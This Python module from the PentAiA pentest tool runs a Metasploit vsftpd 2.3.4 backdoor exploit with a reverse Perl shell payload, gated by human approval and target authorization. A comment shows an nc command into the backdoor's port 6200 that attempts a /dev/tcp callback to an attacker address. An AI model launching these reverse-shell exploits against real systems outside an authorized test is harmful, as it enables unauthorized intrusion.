import logging
import shlex
from dataclasses import asdict, dataclass
from typing import Any

from pentaia.approval import (
    Phase3ActionProposal,
    Phase3ApprovalState,
    require_current_phase3_approval,
)
from pentaia.authorization import authorize_phase3_target
from pentaia.kali_executor import run_command
from pentaia.phase3_ports import listener_reservation, reserve_listener_port
from pentaia.runtime_config import (
    get_phase3_callback_address,
    validate_callback_ipv4,
    validate_listener_port,
)

logger = logging.getLogger(__name__)

# Headroom added to the SSH-side timeout so the remote `timeout` bound fires
# first and PentAiA still receives an exit status rather than a socket timeout.
SSH_TIMEOUT_GRACE = 30


@dataclass(frozen=True)
class MetasploitOperation:
    action_id: str
    module: str
    timeout: int = 120
    requires_callback_address: bool = False
    # Code-owned payload/target selection. These are never model-controlled: they
    # pin the framework's behaviour so it cannot drift with the installed
    # Metasploit version's compiled-in defaults.
    target: int | None = None
    payload: str | None = None
    # The exploitability check refuses to proceed when the backdoor's bind
    # listener (6200/TCP) is already bound by a previous run, which is a benign
    # leftover rather than evidence about the target.
    auto_check: bool = True
    # When true, PentAiA owns a listener on the callback address and the exact
    # runtime-resolved listener port is part of the signed proposal.
    establishes_reverse_session: bool = False


@dataclass(frozen=True)
class MetasploitExecutionResult:
    action_id: str
    target: str
    module: str
    parameters: dict[str, Any]
    stdout: str
    stderr: str
    exit_code: int

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


PREDEFINED_METASPLOIT_OPERATIONS: dict[str, MetasploitOperation] = {
    "validate_vsftpd_234_backdoor": MetasploitOperation(
        action_id="validate_vsftpd_234_backdoor",
        module="exploit/unix/ftp/vsftpd_234_backdoor",
        timeout=120,
        requires_callback_address=True,
        # Verified live against the lab target. The module connects to the
        # backdoor shell on 6200/TCP and runs the payload command through "sh",
        # where bash's /dev/tcp pseudo-device does NOT exist:
        #
        #   $ printf 'echo X > /dev/tcp/172.16.0.13/4444\n' | nc 172.16.0.64 6200
        #   uid=0(root) gid=0(root)
        #   sh: line 2: /dev/tcp/172.16.0.13/4444: No such file or directory
        #
        # So "cmd/unix/reverse_bash" can never connect back and was rejected by
        # test. The target has /usr/bin/perl, and this payload opens an
        # IO::Socket::INET connection instead of relying on shell redirection.
        # "cmd/unix/reverse_python" is the equivalent fallback if Perl is absent.
        payload="cmd/unix/reverse_perl",
        # The backdoor bind listener on 6200/TCP stays bound after it has been
        # triggered once, and the automatic check then aborts the exploit with
        # "Cannot reliably check exploitability". That is a stale-state artifact,
        # not a statement about the target, so skip the automatic check and let
        # the module's own exploit logic handle the already-bound case.
        auto_check=False,
        establishes_reverse_session=True,
    ),
}


def prepare_metasploit_parameters(
    action_id: str,
    model_parameters: dict[str, Any],
    *,
    target: str | None = None,
) -> dict[str, Any]:
    """Resolve runtime-owned material parameters before human approval.

    Model-controlled values are copied first. Runtime-owned values required by the
    code-owned operation are then resolved and validated: the callback address from
    deployment configuration, and a listener port reserved from the approved pool.
    The returned dictionary is suitable for inclusion in the exact signed proposal.

    ``target`` is required for operations that establish a reverse session, because
    the listener reservation is keyed on the pending proposal's identity.
    """
    operation = PREDEFINED_METASPLOIT_OPERATIONS.get(action_id)
    if operation is None:
        raise ValueError(f"Unsupported Phase 3 Metasploit action: {action_id}")

    parameters = dict(model_parameters)
    if operation.requires_callback_address:
        parameters["lhost"] = get_phase3_callback_address()

    if operation.establishes_reverse_session:
        if not target:
            raise ValueError(
                "A target is required to reserve a listener port for this action."
            )

        # Validate the remote port before reserving so an invalid request never
        # takes one. The reservation is keyed on the proposal identity before the
        # port is added, so rebuilding this same proposal reuses the same port and
        # the signature stays stable across the approval decision.
        parameters["rport"] = _validate_rport(parameters.get("rport", 21))
        parameters["lport"] = reserve_listener_port(
            action_id=action_id,
            target=target,
            rport=parameters["rport"],
        )

    return _validate_parameters(action_id, parameters)


def _is_port_number(value: object) -> bool:
    """True only for a genuine integer port, never a bool."""
    return isinstance(value, int) and not isinstance(value, bool)


def _validate_rport(value: object) -> int:
    if not _is_port_number(value):
        raise ValueError("Metasploit rport must be an integer.")
    if not 1 <= value <= 65535:
        raise ValueError("Metasploit rport must be between 1 and 65535.")

    return value


def _validate_parameters(action_id: str, parameters: dict[str, Any]) -> dict[str, Any]:
    if action_id == "validate_vsftpd_234_backdoor":
        unexpected = set(parameters) - {"rport", "lhost", "lport"}
        if unexpected:
            raise ValueError(
                "Unsupported parameters for validate_vsftpd_234_backdoor: "
                + ", ".join(sorted(unexpected))
            )

        rport = _validate_rport(parameters.get("rport", 21))

        lhost = validate_callback_ipv4(parameters.get("lhost"))
        lport = validate_listener_port(parameters.get("lport"))

        return {"rport": rport, "lhost": lhost, "lport": lport}

    raise ValueError(f"Unsupported Phase 3 Metasploit action: {action_id}")


def _require_current_runtime_parameters(
    operation: MetasploitOperation,
    target: str,
    parameters: dict[str, Any],
) -> None:
    """Ensure approval-bound runtime values are still the ones that were approved.

    The listener port is authoritative through its reservation: if the reservation
    expired or was released, the port the human approved is no longer held for us,
    so the approval is stale even though the proposal is unchanged.
    """
    if not operation.requires_callback_address:
        return

    current_lhost = get_phase3_callback_address()
    if parameters["lhost"] != current_lhost:
        raise ValueError(
            "Runtime callback configuration changed after approval; approval is stale."
        )

    if operation.establishes_reverse_session:
        reservation = listener_reservation(
            action_id=operation.action_id,
            target=target,
            rport=parameters["rport"],
        )

        if reservation is None or reservation.lport != parameters.get("lport"):
            raise ValueError(
                "The approved listener port reservation is no longer valid; approval is stale."
            )


def build_resource_script(
    operation: MetasploitOperation,
    target: str,
    parameters: dict[str, Any],
) -> str:
    """Build the code-owned Metasploit resource script, without the run command.

    Every token comes from a code-owned constant or an already validated
    typed/runtime-owned value. No arbitrary commands are accepted. Callers append
    the run/exit behaviour they need.
    """
    rport = parameters["rport"]

    resource_script = (
        f"use {operation.module}; "
        f"set RHOSTS {target}; "
        f"set RPORT {rport}; "
    )

    if operation.target is not None:
        resource_script += f"set TARGET {operation.target}; "

    if operation.payload is not None:
        resource_script += f"set PAYLOAD {operation.payload}; "

    if operation.requires_callback_address:
        resource_script += f"set LHOST {parameters['lhost']}; "

    if operation.establishes_reverse_session:
        # A reverse payload needs the exact PentAiA-owned listener port. It is
        # runtime-resolved and already covered by the signed proposal, so the
        # human approves the precise port the callback will arrive on.
        resource_script += f"set LPORT {parameters['lport']}; "

    if not operation.auto_check:
        resource_script += "set AutoCheck false; "

    return resource_script


def build_live_console_script(
    operation: MetasploitOperation,
    target: str,
    parameters: dict[str, Any],
) -> str:
    """Build a resource script that leaves the console alive for human takeover.

    Unlike the bounded one-shot run, this omits ``exit -y`` so a console held by
    a detached tmux session keeps its handler and the caught session alive. It
    still uses ``-z`` so the console does not block interacting with the session;
    the operator attaches and selects it explicitly.
    """
    return build_resource_script(operation, target, parameters) + "run -z"


def _build_command(
    operation: MetasploitOperation,
    target: str,
    parameters: dict[str, Any],
) -> str:
    resource_script = build_resource_script(operation, target, parameters)

    # "-z" stops msfconsole switching into interactive session mode once the
    # shell opens. Without it, the console reads stdin, hits EOF (PentAiA closes
    # it), and blocks on "Abort session 1? [y/N]" until the timeout bound fires
    # with exit code 124 -- even though the session was established successfully.
    resource_script += "run -z; exit -y"

    # msfconsole's interactive payload handler waits on stdin, which an automated
    # SSH run never supplies, so the process can outlive the exploit itself.
    # Bound it on the remote side: SIGINT lets msfconsole unwind and flush its
    # output, and --kill-after guarantees termination even if it ignores the
    # signal. Without this the call can never return, because paramiko's
    # recv_exit_status() waits on an event with no timeout.
    return (
        f"timeout --signal=INT --kill-after=10 {operation.timeout} "
        f"msfconsole -q -x {shlex.quote(resource_script)}"
    )


def run_metasploit_action(
    proposal: Phase3ActionProposal,
    approval: Phase3ApprovalState | None,
) -> MetasploitExecutionResult:
    """Execute one predefined, authorized, explicitly approved Phase 3 action.

    The wrapper accepts no shell command, module, payload, callback address, or
    free-form console text from the model. The action ID selects a code-owned
    operation and all material parameters must already be present in the exact
    human-approved proposal.
    """
    operation = PREDEFINED_METASPLOIT_OPERATIONS.get(proposal.action_id)
    if operation is None:
        raise ValueError(
            f"Unsupported Phase 3 Metasploit action: {proposal.action_id}"
        )

    # Approval is checked against the exact proposal before any remote execution.
    require_current_phase3_approval(approval, proposal)

    # Authorization is a separate fail-closed gate; deny/protected targets win.
    target = authorize_phase3_target(proposal.target)
    parameters = _validate_parameters(proposal.action_id, proposal.parameters)

    # Runtime-owned material values are resolved before approval, included in the
    # proposal signature, and checked again immediately before execution. A changed,
    # missing, or invalid runtime value makes the prior approval unusable.
    _require_current_runtime_parameters(operation, target, parameters)

    command = _build_command(operation, target, parameters)

    logger.info(
        "Executing approved Phase 3 action action_id=%s target=%s module=%s",
        operation.action_id,
        target,
        operation.module,
    )

    stdout, stderr, exit_code = run_command(
        command,
        timeout=operation.timeout + SSH_TIMEOUT_GRACE,
    )

    logger.info(
        "Phase 3 action completed action_id=%s target=%s exit_code=%s",
        operation.action_id,
        target,
        exit_code,
    )

    return MetasploitExecutionResult(
        action_id=operation.action_id,
        target=target,
        module=operation.module,
        parameters=parameters,
        stdout=stdout,
        stderr=stderr,
        exit_code=exit_code,
    )
